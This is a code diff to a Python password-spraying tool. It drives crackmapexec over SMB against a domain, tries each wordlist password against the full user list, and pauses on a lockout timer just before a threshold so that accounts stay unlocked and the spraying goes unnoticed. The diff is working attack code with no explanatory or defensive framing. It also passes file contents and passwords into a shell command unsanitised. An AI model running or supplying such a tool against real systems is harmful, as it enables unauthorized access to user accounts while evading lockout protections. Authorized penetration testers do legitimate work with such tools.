@@ -39,6 +39,7 @@ def main():
     pass_length = args.pass_length
 
     try:
+        number_of_runs = 0
         with open(args.user, 'r') as file_users:
             user_lines = file_users.readlines()
         with open(args.password, 'r') as file_passwords:
@@ -47,26 +48,20 @@ def main():
         banner()
         print("\n=== Starting Script ====")
 
-        for user_idx, user_line in enumerate(user_lines):
-            user_id = user_line.strip()
+        for pass_idx, pass_line in enumerate(pass_lines):
+            password = pass_line.strip()
 
-            for pass_idx, pass_line in enumerate(pass_lines):
-                password = pass_line.strip()
+            cme_command = f"crackmapexec smb '{domain_name}' -u $(cat {args.user}) -p '{password}' --continue-on-success"
+            p = subprocess.Popen(cme_command, shell=True, stdout=subprocess.PIPE, text=True)
 
-                print(f"\n[+] Testing user {user_idx + 1}/{len(user_lines)} and password {pass_idx + 1}/{len(pass_lines)}: '{password}' ...")
-                cme_command = f"crackmapexec smb '{domain_name}' -u '{user_id}' -p '{password}'"
-                p = subprocess.Popen(cme_command, shell=True, stdout=subprocess.PIPE, text=True)
+            for output_line in p.stdout:
+                print(output_line)
+                
+            number_of_runs = number_of_runs + 1
+            p.stdout.close()
+            p.wait()
 
-                for output_line in p.stdout:
-                    if "[+]" in output_line:
-                        # print in green
-                        print("[+] Found password for" + "\033[32m {user} : {password}\033[0m".format(user=user_id, password=password))
-                        break  
-
-                p.stdout.close()
-                p.wait()
-
-                failed_attempts = 0
+            if number_of_runs == (args.treshold - 3):
                 start_time = time.time()
                 end_time = start_time + (args.lockout * 60)
                 while time.time() < end_time:
@@ -75,8 +70,8 @@ def main():
                     time_format = '{:02d}:{:02d}'.format(minutes, seconds)
                     print(f"Threshold reached - waiting for Lockout Timer: {time_format}", end='\r')
                     time.sleep(1)
-
-                
+            else:
+                continue
 
     except KeyboardInterrupt:
         print("\n\nKeyboardInterrupt received. Exit script...")
